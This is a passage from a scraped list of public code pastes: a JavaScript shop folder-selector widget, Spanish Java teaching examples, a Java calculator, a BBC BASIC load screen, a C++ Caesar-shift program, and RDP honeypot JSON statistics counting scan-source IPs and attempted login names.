        print(d['url'])
else:
    print(f'Error fetching data from the website')
"
eLSvzMkL,shop_folder_select,valeraplusplus,JavaScript,Thursday 23rd of November 2023 08:48:04 PM CDT,"lpc_template.createCardsShop = {

	changeFolder: function( $self, folderId  ){

		$self.find('.block-id-folder').text(folderId).addClass('modified modified-text');

		lpc_template.createCardsShop.getProducts( $self[0] );
	},
	createSelect: function($self){
		/*parent wraper */
		let containerFolder = $self.find(`.lpc-select-folder-container`); // mainContainer


		let queryFolder = containerFolder.find(`.lpc-query-folder`); // Logic query
		let selectFolder = queryFolder.find('.lpc-query-folder__select');
		/*parent wraper */

		let folderInputSelected = queryFolder.find('.lpc-query-folder__input'); /* preview BTN */

		let folderId = queryFolder.attr('data-folder_id');

		let selectFolderBody = queryFolder.find('.lpc-query-folder__body'); /* option BOdy */

		let flagLoadFolder = 0;

		async function fetchAndCreateSelect() {
			try {
				// Создаем параметры запроса
				let params = new URLSearchParams();
				params.append('param[type]', 'shop2');
				params.append('param[depth]', '6');
	
				// Формируем URL для GET-запроса
				let url = '/my/s3/xapi/public/?method=folder/getTree&' + params.toString();
	
				// Отправляем GET-запрос с использованием fetch
				let response = await fetch(url, {
					method: 'GET',
					headers: {
						'Content-Type': 'application/json'
					}
				});
	
				if (!response.ok) {
					throw new Error('Ошибка при выполнении запроса');
				}
	
				let data = await response.json();
	
				if ( data.result.success ) {
					let items = data.result.items;
	
					// Нет категории магазина
					if( !items.length ){
						queryFolder.addClass('lpc-shop-not-found');
						return false;
					}

					items.shift(); // удаляет первую категорию
					// Создаем варианты (option) выпадающего списка и добавляем их к существующему select

					function createSelector(data) {
						var rootUL = document.createElement('ul');
						var levelObject = {};
						var parentLi = null;
					
						data.forEach(item => {
							var li = document.createElement('li');
							var div = document.createElement('div');
							div.className = 'lpc-query-folder__option lpc-query__option';
							div.setAttribute('data-folder_id', item.folder_id);
					
							var span = document.createElement('span');
							
							function decodeHtmlEntities(input) {
								var doc = new DOMParser().parseFromString(input, ""text/html"");
								return doc.documentElement.textContent;
							}
							span.textContent = decodeHtmlEntities( item.folder_name );
							div.title = decodeHtmlEntities( item.folder_name );

							var i = document.createElement('i');
							i.textContent = `(${item.items})`;
					
							div.appendChild(span);
							div.appendChild(i);
							li.appendChild(div);
					
							let level = Number(item._level);
					
							if (level == 1) {
								rootUL.appendChild(li);
								parentLi = li;
								levelObject = {};
							} else {
								if (!levelObject[level]) {
									levelObject[level] = document.createElement('ul');
									parentLi.appendChild(levelObject[level]);
								}
								levelObject[level].appendChild(li);
								parentLi = li;
							}
					
							if( folderId && folderId == item.folder_id ){
								folderInputSelected.find('span').text(
									$( div )
										.addClass('selected active')
										.find('span')
										.text()
								);
								//$( div ).addClass('active');
							}
						});
					
						return rootUL;
					}
					selectFolderBody.append( createSelector( items ) );

					return true;
				}
			} catch (error) {
				console.error('Ошибка при выполнении запроса:', error);
				return false;
			}
		}

		async function loadSelectedOption() {
			let awaitCreateSelect = await fetchAndCreateSelect(); // Ждем выполнения

			if( awaitCreateSelect ){
				queryFolder
				.removeClass('load')
				.addClass('loaded');

				folderInputSelected.on('click', function (e) {
					selectFolder.toggleClass(""open"");
				});
				let queryFolderOption = queryFolder.find('.lpc-query-folder__option'); /* option select */

				queryFolderOption.on('click', function (e) {
					let $this = $(this);
					let folderId = $this.data('folder_id');
					queryFolderOption.removeClass('active');
					$this
						.addClass('active')
						.siblings()
						.removeClass('active');
					folderInputSelected.find('span').text($this.find('span').text());
					selectFolder.toggleClass(""open"");

					lpc_template.createCardsShop.changeFolder( $self, folderId );

					if(!flagLoadFolder){
						queryFolder.addClass('folder-selected')
					}

				});
			}
		}
        
		loadSelectedOption();
	},
	watchLoadBlock: function (block) {
		var elem = '.lpc_lazy_load';


		let options = {
			rootMargin: '0px 0px 0px 0px'
		};
		let imageObserver = new IntersectionObserver((entries, imgObserver) => {
			entries.forEach((entry) => {
				if (entry.isIntersecting) {
					const lazyBox = entry.target // Текущий элемент

					if (lazyBox.tagName == 'IMG') {
						lazyBox.src = lazyBox.dataset.src // Адрес картинки data-src=""""
						lazyBox.classList.remove(elem); 
						imgObserver.unobserve(lazyBox);
						
					}if (lazyBox.dataset.func) { // Если элемент содержит data-func
						lpc_template.createCardsShop.getProducts(lazyBox); // Вызов функции
						lazyBox.classList.remove(elem);
						imgObserver.unobserve(lazyBox);
					} else {
						lazyBox.classList.remove(elem);
						imgObserver.unobserve(lazyBox);
					}
				}
			})
		}, options);

		var arr = document.querySelectorAll(elem);

		if(typeof block != 'undefined'){
			arr = block.querySelectorAll(elem);
		}
		arr.forEach((v) => {
			imageObserver.observe(v);
		});
	},
	flagStartScript: 0
};

lpc_template.queue.folderBlock = function($self) {
	
	let $blocks = $self.find('.lpc-folder-block');
	
	if ($blocks.length) {
		if( lpc_template.createCardsShop.flagStartScript == 0 ){
			lpc_template.createCardsShop.flagStartScript = 1;
			lpc_template.createCardsShop.watchLoadBlock();
		}
		
		$blocks.each(function () {
			let $block = $(this);

			if(s3LP.is_cms){
				
				lpc_template.createCardsShop.createSelect( $block.parent() );

				if( $self.is('div') ){
					lpc_template.createCardsShop.getProducts( $self );
				}
			}

		})
	}
}; "
Q1RgnX7Q,mas sobre interfaces,teslariu,Java,Thursday 23rd of November 2023 07:02:53 PM CDT,"/*
* Clases abstractas, concretas, polimorfismo, interfaces
*
*
*
*/


public class Cliente {
	
	String cuit;                               
	String direccion;
	float saldo;
	
	public void extraer(int monto) {
		if (saldo >= monto){
			saldo = saldo - monto
		}
	}
	
}


class ClientePyme extends Cliente {
	
	String razonSocial;
	float descubierto;
	
	public void extraer(int monto) {
		if (saldo + descubierto >= monto){
			saldo = saldo - monto
		}
}

abstract class Vehiculo{
	boolean conductor;
	boolean motor;
	
	abstract void mover();
	}


///////////////////////////////////////////////////

////  INTERFAZ UNICA

public interface Vehiculo(
	public float maxVel;
	public void arrancar();
	public void detener();
)

public class Auto implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo..."");
	}
)

// Creo un auto
Vehiculo miAuto = new Auto();


//  polimorfismo
public class Camion implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando el camión..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo el camión..."");
	}
)

// Creo un camión
Vehiculo miCamion = new Camion();


//// INTERFACES MULTIPLES
public interface GPS{
	public String getCoordenadas();            
}

public interface Radio {                       
	public void encenderRadio();
	public void apagarRadio(); 
}

public class Smartphone implements GPS,Radio {
	public String getCoordenadas(){
			// return coordenadas;
	}
	
	public void encenderRadio(){
			System.out.println(""Encendiendo radio..."");
	}
	
	public void apagarRadio(){
			System.out.println(""Apagando radio..."");
	}

}


/// Clase final: es una clase QUE NO PUEDE SER EXTENDIDA (no se puede heredar,no puede tener subclases)

final class Persona{
	
	String Nombre;
	String Apellido;
	int DNI;
	
	/// getters y setters
	// puedo declarar algun metodo final
	final void mostrar(){
			System.out.println(""No tengo hereredos..."");
		}
	}

// Un atributo de Clase tambien llamados ESTATICOS: pertenece a TODA LA CLASE
// y no a un objeto en particular; son estaticos (constantes)

clase Perro:
a. metodos: correr, jugar, caminar, saltar, etc
b. atributos: raza, especie = ""Canis familiaris""

/// Mas sobre interfaces

//// INTERFACES MULTIPLES con igual firma
public interface GPS{
	public String getCoordenadas();            
}

public interface Radio {                       
	public void encender();
	public void apagar();
	public void siguiente(){
		// proxima radio
	}
}

public interface ReproductorMusica {                       
	public void encender();
	public void apagar();
	public void siguiente(){
		// proxima cancion
	}
}


public class Smartphone implements GPS,Radio,ReproductorMusica {
	public String getCoordenadas(){
			// return coordenadas;
	}
	
	// aca irian los metodos
	public void siguiente(){
		Reproductor.super.siguiente(); // llamo el metodo en reproductor musica
	}
}


// llamada:
Smartphone moto = new Smartphone();
moto.siguiente();    // reproduce siguiente cancion en el reproductor de musica

// herencia de interfaz
 public interface A{
	 }
 
 public interface B extends A{
	 }


"
jitia0H5,Ejemplo de interaccion entre clases,teslariu,Java,Thursday 23rd of November 2023 06:51:55 PM CDT,"/*
 * Problema: un cliente interactua con una caja de ahorro y deposita
 * $100000, ingresando su clave para  realizar el depósito
 * 
 * 
 */


public class Principal {
	
	class CajaDeAhorro{
		
		private float saldo;
		
		public void depositar(float monto){
			saldo = saldo + monto;
		}
		
		public void setSaldo(float s){
			saldo = s;
		}
		
		public float getSaldo(){
			return saldo;
		}
		
		// Constructor
		CajaDeAhorro(float s){
				saldo = s;
		}
		
	}
	
	class Cliente{
	
		private int DNI;
		private String Clave;
		private CajaDeAhorro Cuenta;
		
		// Constructor
		Cliente(int d, String c, CajaDeAhorro cda){
				DNI = d;
				Clave = c;
				Cuenta = cda;
		}
		
		// metodos
		public CajaDeAhorro getCajaDeAhorro(){
			return Cuenta;
		}
		
		// getters y setters de DNI y Clave
		//  ........
	
	
	
	}
	
	public static void main (String[] args) {
		
		// Construimos una instancia de caja de ahorro con $50.000
		CajaDeAhorro c1 = new CajaDeAhorro(50000)
		
		// Construyo el cliente
		Cliente cliente = new Cliente(38555122,""clave"",c1)
		
		// deposito el dinero
		cliente.Cuenta.depositar(100000)
		
		// verifico el saldo:
		System.out.println(""Saldo: "" + cliente.Cuenta.getSaldo())
		
	}
}

"
fhEKCHNi,Day 14 try catch finally,HarrJ,Java,Thursday 23rd of November 2023 06:39:42 PM CDT,"import java.util.Scanner;

public class Day14A {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        double num1, num2;
        String storeValue, opr;
        try {
            System.out.print(""Enter 1st value: "");
            storeValue = sc.nextLine();
            num1 = Double.parseDouble(storeValue);
            System.out.print(""Enter math operation(+ - * /): "");
            opr = sc.nextLine();
            System.out.print(""Enter 2nd value: "");
            storeValue = sc.nextLine();
            num2 = Double.parseDouble(storeValue);
            
            compute(num1, num2, opr);
        } catch (Exception e) {
            System.out.println(""Error on the user typed value"");
        } finally {
            System.out.println(""code complete"");
        }
    }
    
    // modified code from Day10A and Day12F file
    static void compute(double n1, double n2, String op){
        boolean computeSuccess = true;
        String printout ="""";
        double result = 0;
        switch (op) {
            case ""+"":
                result = n1 + n2;
                break;
            case ""-"":
                result = n1 - n2;
                break;
            case ""*"":
                result = n1 * n2;
                break;
            case ""/"":
                try {
                    result = n1 / n2;
                } catch (Exception e) {
                    printout = ""Cannot divide by zero"";
                    computeSuccess = false;
                }
                break;
            default:
                printout = ""Operator not on list"";
                computeSuccess = false;
        }
        if (computeSuccess) {
            printout = String.format(""%.2f %s %.2f = %.4f""
                , n1, op, n2, result);
        }
        System.out.println(printout);
    }
}"
imJfUZ6y,Agon Light2 Load Screen,lovejoy777,ZXBasic,Thursday 23rd of November 2023 06:39:31 PM CDT,"   10 REM BBC Basic header file
   20 REM Written by Steve Lovejoy aka Lovejoy777
   30 REM Icon design by Arnold Meszaros (netangel)
   100 :
   101 REM Initialization, getting system vars, setting others
   102 REM MODE 0  = 80x60, 16 colours.
   103 REM MODE 1  = 80x60, 4 colours.
   104 REM MODE 2  = 80x60, 2 colours.
   105 REM MODE 3  = 80x30, 64 colours.
   106 REM MODE 4  = 80x30, 16 colours.
   107 REM MODE 7  = 40x25, 16 colours orig bbcmicro.
   108 REM MODE 8  = 40x30, 64 colours.
   109 REM MODE 12 = 40X25, 64 colours.
   110 M% = 8: REM Screen mode
   120 BG% = 140: REM Background color (blue)
   130 FG%= 15: REM Foreground color (white)
   140 MODE M%: COLOUR BG%: COLOUR FG%: CLS
   150 W%=FN_GETBYTE_VDP(&13): REM Screen width in chars
   160 H%=FN_GETBYTE_VDP(&14): REM Screen height in chars
   170 C%=FN_GETBYTE_VDP(&15): REM Number of colours
   180 F%=48000: REM Free BASIC bytes
   200 :
   201 REM Agon Light ""Sitting Kung Fu man"" logo chars
   210 VDU 23,200,7,15,31,31,31,31,31,63
   220 VDU 23,201,192,224,240,240,240,240,240,248
   230 VDU 23,202,63,63,31,15,15,15,7,7
   240 VDU 23,203,248,248,240,224,224,224,192,192
   250 VDU 23,204,0,1,7,15,31,63,127,127
   260 VDU 23,205,7,199,199,195,227,225,240,240
   270 VDU 23,206,192,195,195,135,135,15,15,31
   280 VDU 23,207,0,0,224,240,248,252,252,254
   290 VDU 23,208,0,0,1,1,3,3,7,7
   300 VDU 23,209,255,255,255,255,255,255,255,255
   310 VDU 23,210,248,248,248,240,224,225,193,195
   320 VDU 23,211,63,63,127,255,255,255,255,255
   330 VDU 23,212,255,255,255,255,255,255,223,223
   340 VDU 23,213,0,0,128,128,128,192,192,192
   350 VDU 23,214,7,7,15,15,15,15,15,31
   360 VDU 23,215,255,247,231,231,231,199,135,130
   370 VDU 23,216,199,135,135,143,15,15,31,31
   380 VDU 23,217,207,207,207,199,199,195,129,1
   390 VDU 23,218,224,224,224,240,240,240,240,240
   400 VDU 23,219,31,31,31,31,15,15,15,31
   410 VDU 23,220,128,128,128,128,129,143,135,143
   420 VDU 23,221,31,63,15,0,128,224,224,195
   430 VDU 23,222,252,240,128,0,3,7,35,243
   440 VDU 23,223,1,1,1,129,193,225,241,241
   450 VDU 23,224,240,240,240,240,240,240,240,240
   460 VDU 23,225,31,31,3,3,3,3,7,15
   470 VDU 23,226,223,255,255,255,255,255,254,254
   480 VDU 23,227,199,135,135,7,15,15,31,31
   490 VDU 23,228,241,241,241,248,248,248,248,248
   500 VDU 23,229,253,255,255,255,255,255,255,127
   510 VDU 23,230,240,248,248,224,224,224,240,248
   520 VDU 23,231,31,63,63,63,31,31,15,0
   530 VDU 23,232,254,252,252,252,248,248,224,0
   540 VDU 23,233,31,60,32,0,0,0,0,0
   550 VDU 23,234,120,28,12,12,0,0,0,0
   560 VDU 23,235,127,127,127,127,127,63,15,0
   570 VDU 23,236,248,252,252,252,252,248,240,0
   580 VDU 23,237,255,254,252,248,240,224,192,128
   600 :
   601 REM Displaying the logo line by line
   602 REM From custom chars defined previously
   610 COLOUR 15: PRINT TAB(2,1);""  "";CHR$(200);CHR$(201);""   "";
   630 COLOUR 15: PRINT TAB(2,2);""  "";CHR$(202);CHR$(203);""   "";
   650 COLOUR 15: PRINT TAB(2,3);"" "";CHR$(204);CHR$(205);CHR$(206);CHR$(207);""  "";
   670 COLOUR 15: PRINT TAB(2,4);CHR$(208);CHR$(209);CHR$(210);CHR$(211);CHR$(212);CHR$(213);"" "";
   690 COLOUR 15: PRINT TAB(2,5);CHR$(214);CHR$(215);CHR$(216);CHR$(209);CHR$(217);CHR$(218);"" "";
   710 COLOUR 15: PRINT TAB(2,6);CHR$(219);CHR$(220);CHR$(221);CHR$(222);CHR$(223);CHR$(224);"" "";
   730 COLOUR 15: PRINT TAB(2,7);CHR$(225);CHR$(226);CHR$(227);CHR$(228);CHR$(229);CHR$(230);"" "";
   750 COLOUR 15: PRINT TAB(2,8);CHR$(231);CHR$(232);CHR$(233);CHR$(234);CHR$(235);CHR$(236);"" "";
   800 :
   801 REM Displaying the header title and imfo line by line.
   830 PRINT TAB(10,1);""** AGON LIGHT2 BASIC V3 **""
   850 PRINT TAB(10,3);""MODE:("";M%;"") "";W%;""x"";H%;"" COLOURS:"";C%;
   860 PRINT TAB(10,5);""BASIC BYTES FREE:"";F%;
   870 PRINT TAB(10,7);""CPU:ZILOG eZ80""
   900 :
   901 REM SET READY PROMPT.
   910 COLOUR BG%: COLOUR FG%
   920 PRINT TAB(0,11);""AGON READY.""
   930 REM NEW
   940 END
   950 :
   960 DEF FN_GETBYTE_VDP(V%): A%=&A0: L%=V%: =USR(&FFF4)
   970 :
   980 DEF FN_GETWORD_VDP(V%): =FN_GETBYTE_VDP(V%)+256*FN_GETBYTE_VDP(V%+1)"
aSiti7Us,Enigma,erehh,C++,Thursday 23rd of November 2023 06:38:24 PM CDT,"#include <iostream>

using namespace std;

// Function prototypes
char* transform(char letter, int shift);
void Enigma();

char userChoice;

int main() {
    do {
        Enigma();
    } while (userChoice != '3');

    cout << ""Exiting Enigma. Goodbye! "" << endl;
    cout << endl;

    return 0;
}

void Enigma() {
    cout << ""Welcome to the Enigma Machine. "" << endl;
    cout << endl;
    cout << ""What would you like to do? "" << endl;
    cout << ""1) Encode \n2) Decode \n3) Exit"" << endl;
    cout << ""Your Answer: "";
    cin >> userChoice;
    cout << endl;

    // Check if the value entered by the user is valid
    if (userChoice < '1' || userChoice > '3') {
        cout << ""Invalid choice. Please, enter a valid option."" << endl;
        cout << endl;
        return;
    }

    // Check to see if the user wants to exit the program
    if (userChoice == '3') {
        return;
    }

    char inputLetter;
    cout << ""Enter a letter: "";
    cin >> inputLetter;

    char* result = transform(inputLetter, (userChoice == '1') ? 7 : -7);

    cout << (userChoice == '1' ? ""Encoded "" : ""Decoded "") << ""Result: "" << result << endl;
    cout << endl;
    delete[] result; // Free the allocated memory
}

char* transform(char letter, int shift) {
    char* result = new char[2];

    if (isalpha(letter)) {
        result[0] = static_cast<char>((tolower(letter) - 'a' + shift + 26) % 26 + 'a');
    }
    else {
        result[0] = letter;
    }
    result[1] = '\0';
    return result;
}"
16mkQy58,2023-11-23_stats.json,rdp_snitch,JSON,Thursday 23rd of November 2023 06:18:07 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 66,
    ""58.218.204.183"": 12,
    ""139.162.175.215"": 12,
    ""152.32.183.240"": 3,
    ""149.28.150.188"": 120,
    ""66.42.53.73"": 96,
    ""45.32.117.150"": 87,
    ""45.77.40.213"": 108,
    ""149.28.153.131"": 105,
    ""139.180.157.173"": 102,
    ""207.148.126.207"": 114,
    ""139.180.157.26"": 102,
    ""207.148.78.121"": 108,
    ""139.180.145.140"": 102,
    ""139.180.211.93"": 93,
    ""207.148.69.220"": 105,
    ""139.180.137.38"": 117,
    ""45.76.187.113"": 111,
    ""149.28.157.98"": 78,
    ""45.76.153.222"": 120,
    ""207.148.74.151"": 96,
    ""139.180.159.130"": 87,
    ""149.28.143.22"": 87,
    ""163.177.115.88"": 3,
    ""45.227.254.49"": 6,
    ""62.204.41.132"": 27,
    ""103.149.137.93"": 1473,
    ""94.232.41.30"": 3,
    ""103.30.10.17"": 651,
    ""103.209.61.132"": 1464,
    ""106.116.169.71"": 3,
    ""185.220.103.12"": 3,
    ""205.210.31.107"": 9,
    ""212.70.149.146"": 3,
    ""141.98.11.169"": 9,
    ""162.142.125.222"": 3,
    ""94.102.61.23"": 3,
    ""67.133.192.80"": 3,
    ""194.165.16.76"": 6,
    ""205.210.31.136"": 9,
    ""103.47.194.135"": 6,
    ""103.231.59.163"": 21,
    ""185.156.72.20"": 3,
    ""152.32.159.79"": 3,
    ""141.98.81.155"": 3,
    ""45.227.254.55"": 6,
    ""205.210.31.48"": 9,
    ""185.73.124.50"": 6,
    ""52.144.46.129"": 3,
    ""162.209.206.10"": 9,
    ""185.170.144.3"": 3,
    ""36.91.222.100"": 3,
    ""203.124.37.152"": 3,
    ""23.230.171.15"": 3,
    ""198.235.24.171"": 9,
    ""205.164.28.218"": 6,
    ""176.113.115.65"": 3,
    ""45.227.254.48"": 6,
    ""45.77.71.172"": 6
  },
  ""asn"": {
    ""AS48721"": 72,
    ""AS4134"": 15,
    ""AS63949"": 12,
    ""AS135377"": 6,
    ""AS20473"": 1944,
    ""AS17816"": 3,
    ""AS267784"": 18,
    ""AS59425"": 27,
    ""AS63737"": 3588,
    ""AS208091"": 9,
    ""AS4224"": 3,
    ""AS396982"": 36,
    ""AS204428"": 3,
    ""AS209605"": 9,
    ""AS398324"": 3,
    ""AS202425"": 3,
    ""AS209"": 3,
    ""AS140832"": 6,
    ""AS132335"": 21,
    ""AS61432"": 3,
    ""AS209588"": 3,
    ""AS36007"": 3,
    ""AS40065"": 9,
    ""AS197414"": 3,
    ""AS7713"": 3,
    ""AS7590"": 3,
    ""AS14315"": 3,
    ""AS149440"": 6,
    ""AS57678"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 93,
    ""Chinanet"": 15,
    ""Akamai Technologies, Inc."": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""The Constant Company"": 702,
    ""Choopa"": 1242,
    ""China Unicom Guangdong Province Network"": 3,
    ""Horizon LLC"": 27,
    ""Vietserver Services Technology Company Limited"": 2937,
    ""Xhost Internet Solutions LP"": 12,
    ""SKY"": 651,
    ""The Calyx Institute"": 3,
    ""Google LLC"": 36,
    ""SS-Net"": 3,
    ""UAB Host Baltic"": 9,
    ""Censys, Inc."": 3,
    ""IP Volume inc"": 3,
    ""CenturyLink"": 3,
    ""FTECH"": 6,
    ""LeapSwitch Networks Pvt Ltd"": 21,
    ""TOV VAIZ PARTNER"": 3,
    ""Kamatera, Inc."": 3,
    ""CloudRadium L.L.C"": 9,
    ""PT Telekomunikasi Indonesia"": 3,
    ""COMSATS"": 3,
    ""Ipxo LLC"": 3,
    ""EGIHosting"": 6,
    ""Cat Technologies Co. Limited"": 3
  },
  ""org"": {
    ""Flyservers S.A"": 75,
    ""Chinanet JS"": 12,
    ""Linode, LLC"": 12,
    ""Ucloud Information Technology"": 6,
    ""Vultr Holdings, LLC"": 822,
    ""Unknown"": 1143,
    ""UAB Host Baltic"": 18,
    ""Horizon LLC"": 27,
    ""Siddhi Cable And Network Private Limited"": 1473,
    ""Dmitriy Panchenko"": 3,
    ""Skynode Company Limited"": 651,
    ""T-media Digital Technology Company Limited"": 1464,
    ""Chinanet HE"": 3,
    ""The Calyx Institute"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""4Media Ltd"": 3,
    ""Censys Inc"": 3,
    ""AI Spera"": 3,
    ""CenturyLink, Inc"": 3,
    ""IPXO"": 21,
    ""TOV VAIZ PARTNER"": 3,
    ""Xhostis"": 9,
    ""Cloud Web Manage"": 3,
    ""zhang san"": 9,
    ""Telekomunikasi Indonesia"": 3,
    ""CIS HQ"": 3,
    ""Evoxt"": 6,
    ""Cat Technologies Co. Limited"": 3
  },
  ""regionName"": {
    ""Kaunas"": 81,
    ""Jiangsu"": 12,
    ""Hesse"": 12,
    ""Virginia"": 3,
    ""South West"": 1755,
    ""Central Singapore"": 183,
    ""Guangdong"": 3,
    ""Vilnius"": 18,
    ""Moscow"": 30,
    ""Tinh Thai Binh"": 1473,
    ""Perm Krai"": 3,
    ""Hanoi"": 2115,
    ""Hebei"": 3,
    ""New York"": 9,
    ""California"": 57,
    ""Plovdiv"": 3,
    ""Michigan"": 3,
    ""North Holland"": 12,
    ""Tinh Thanh Hoa"": 6,
    ""Maharashtra"": 24,
    ""Kyiv City"": 3,
    ""Drenthe"": 3,
    ""Jakarta"": 3,
    ""Islamabad"": 3,
    ""South Carolina"": 3
  },
  ""country"": {
    ""Lithuania"": 99,
    ""China"": 18,
    ""Germany"": 12,
    ""United States"": 75,
    ""Singapore"": 1938,
    ""Russia"": 33,
    ""Vietnam"": 3594,
    ""Bulgaria"": 3,
    ""Netherlands"": 15,
    ""India"": 24,
    ""Ukraine"": 3,
    ""Indonesia"": 3,
    ""Pakistan"": 3
  },
  ""account"": {
    ""hello"": 138,
    ""(empty)"": 24,
    ""nmap"": 6,
    ""142.93.8.59"": 5532,
    ""Test"": 36,
    ""PeJnKfbaO"": 3,
    ""uWgcGq"": 3,
    ""WqFGCF"": 3,
    ""Domain"": 30,
    ""ZASxTcMgO"": 3,
    ""ICknSa"": 3,
    ""MhGMaZ"": 3,
    ""Administrator"": 3,
    ""Administr"": 15,
    ""QPEUsGAWX"": 3,
    ""LrTJnC"": 3,
    ""pmChfS"": 3,
    ""BGfjeNPLQ"": 3,
    ""zCUTNb"": 3,
    ""kfgBLT"": 3
  },
  ""keyboard"": {
    ""Unknown"": 5820
  },
  ""client_build"": {
    ""Unknown"": 5820
  },
  ""client_name"": {
    ""Unknown"": 5820
  },
  ""ip_type"": {
    ""Unknown"": 3771,
    ""proxy"": 18,
    ""hosting"": 1830,
    ""hosting & proxy"": 201
  }
}"
vqQ6bw6V,2023-11-23_stats.json,rdp_snitch,JSON,Thursday 23rd of November 2023 06:16:10 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 44,
    ""58.218.204.183"": 8,
    ""139.162.175.215"": 8,
    ""152.32.183.240"": 2,
    ""149.28.150.188"": 80,
    ""66.42.53.73"": 64,
    ""45.32.117.150"": 58,
    ""45.77.40.213"": 72,
    ""149.28.153.131"": 70,
    ""139.180.157.173"": 68,
    ""207.148.126.207"": 76,
    ""139.180.157.26"": 68,
    ""207.148.78.121"": 72,
    ""139.180.145.140"": 68,
    ""139.180.211.93"": 62,
    ""207.148.69.220"": 70,
    ""139.180.137.38"": 78,
    ""45.76.187.113"": 74,
    ""149.28.157.98"": 52,
    ""45.76.153.222"": 80,
    ""207.148.74.151"": 64,
    ""139.180.159.130"": 58,
    ""149.28.143.22"": 58,
    ""163.177.115.88"": 2,
    ""45.227.254.49"": 4,
    ""62.204.41.132"": 18,
    ""103.149.137.93"": 982,
    ""94.232.41.30"": 2,
    ""103.30.10.17"": 434,
    ""103.209.61.132"": 976,
    ""106.116.169.71"": 2,
    ""185.220.103.12"": 2,
    ""205.210.31.107"": 6,
    ""212.70.149.146"": 2,
    ""141.98.11.169"": 6,
    ""162.142.125.222"": 2,
    ""94.102.61.23"": 2,
    ""67.133.192.80"": 2,
    ""194.165.16.76"": 4,
    ""205.210.31.136"": 6,
    ""103.47.194.135"": 4,
    ""103.231.59.163"": 14,
    ""185.156.72.20"": 2,
    ""152.32.159.79"": 2,
    ""141.98.81.155"": 2,
    ""45.227.254.55"": 4,
    ""205.210.31.48"": 6,
    ""185.73.124.50"": 4,
    ""52.144.46.129"": 2,
    ""162.209.206.10"": 6,
    ""185.170.144.3"": 2,
    ""36.91.222.100"": 2,
    ""203.124.37.152"": 2,
    ""23.230.171.15"": 2,
    ""198.235.24.171"": 6,
    ""205.164.28.218"": 4,
    ""176.113.115.65"": 2,
    ""45.227.254.48"": 4,
    ""45.77.71.172"": 4
  },
  ""asn"": {
    ""AS48721"": 48,
    ""AS4134"": 10,
    ""AS63949"": 8,
    ""AS135377"": 4,
    ""AS20473"": 1296,
    ""AS17816"": 2,
    ""AS267784"": 12,
    ""AS59425"": 18,
    ""AS63737"": 2392,
    ""AS208091"": 6,
    ""AS4224"": 2,
    ""AS396982"": 24,
    ""AS204428"": 2,
    ""AS209605"": 6,
    ""AS398324"": 2,
    ""AS202425"": 2,
    ""AS209"": 2,
    ""AS140832"": 4,
    ""AS132335"": 14,
    ""AS61432"": 2,
    ""AS209588"": 2,
    ""AS36007"": 2,
    ""AS40065"": 6,
    ""AS197414"": 2,
    ""AS7713"": 2,
    ""AS7590"": 2,
    ""AS14315"": 2,
    ""AS149440"": 4,
    ""AS57678"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 62,
    ""Chinanet"": 10,
    ""Akamai Technologies, Inc."": 8,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""The Constant Company"": 468,
    ""Choopa"": 828,
    ""China Unicom Guangdong Province Network"": 2,
    ""Horizon LLC"": 18,
    ""Vietserver Services Technology Company Limited"": 1958,
    ""Xhost Internet Solutions LP"": 8,
    ""SKY"": 434,
    ""The Calyx Institute"": 2,
    ""Google LLC"": 24,
    ""SS-Net"": 2,
    ""UAB Host Baltic"": 6,
    ""Censys, Inc."": 2,
    ""IP Volume inc"": 2,
    ""CenturyLink"": 2,
    ""FTECH"": 4,
    ""LeapSwitch Networks Pvt Ltd"": 14,
    ""TOV VAIZ PARTNER"": 2,
    ""Kamatera, Inc."": 2,
    ""CloudRadium L.L.C"": 6,
    ""PT Telekomunikasi Indonesia"": 2,
    ""COMSATS"": 2,
    ""Ipxo LLC"": 2,
    ""EGIHosting"": 4,
    ""Cat Technologies Co. Limited"": 2
  },
  ""org"": {
    ""Flyservers S.A"": 50,
    ""Chinanet JS"": 8,
    ""Linode, LLC"": 8,
    ""Ucloud Information Technology"": 4,
    ""Vultr Holdings, LLC"": 548,
    ""Unknown"": 762,
    ""UAB Host Baltic"": 12,
    ""Horizon LLC"": 18,
    ""Siddhi Cable And Network Private Limited"": 982,
    ""Dmitriy Panchenko"": 2,
    ""Skynode Company Limited"": 434,
    ""T-media Digital Technology Company Limited"": 976,
    ""Chinanet HE"": 2,
    ""The Calyx Institute"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""4Media Ltd"": 2,
    ""Censys Inc"": 2,
    ""AI Spera"": 2,
    ""CenturyLink, Inc"": 2,
    ""IPXO"": 14,
    ""TOV VAIZ PARTNER"": 2,
    ""Xhostis"": 6,
    ""Cloud Web Manage"": 2,
    ""zhang san"": 6,
    ""Telekomunikasi Indonesia"": 2,
    ""CIS HQ"": 2,
    ""Evoxt"": 4,
    ""Cat Technologies Co. Limited"": 2
  },
  ""regionName"": {
    ""Kaunas"": 54,
    ""Jiangsu"": 8,
    ""Hesse"": 8,
    ""Virginia"": 2,
    ""South West"": 1170,
    ""Central Singapore"": 122,
    ""Guangdong"": 2,
    ""Vilnius"": 12,
    ""Moscow"": 20,
    ""Tinh Thai Binh"": 982,
    ""Perm Krai"": 2,
    ""Hanoi"": 1410,
    ""Hebei"": 2,
    ""New York"": 6,
    ""California"": 38,
    ""Plovdiv"": 2,
    ""Michigan"": 2,
    ""North Holland"": 8,
    ""Tinh Thanh Hoa"": 4,
    ""Maharashtra"": 16,
    ""Kyiv City"": 2,
    ""Drenthe"": 2,
    ""Jakarta"": 2,
    ""Islamabad"": 2,
    ""South Carolina"": 2
  },
  ""country"": {
    ""Lithuania"": 66,
    ""China"": 12,
    ""Germany"": 8,
    ""United States"": 50,
    ""Singapore"": 1292,
    ""Russia"": 22,
    ""Vietnam"": 2396,
    ""Bulgaria"": 2,
    ""Netherlands"": 10,
    ""India"": 16,
    ""Ukraine"": 2,
    ""Indonesia"": 2,
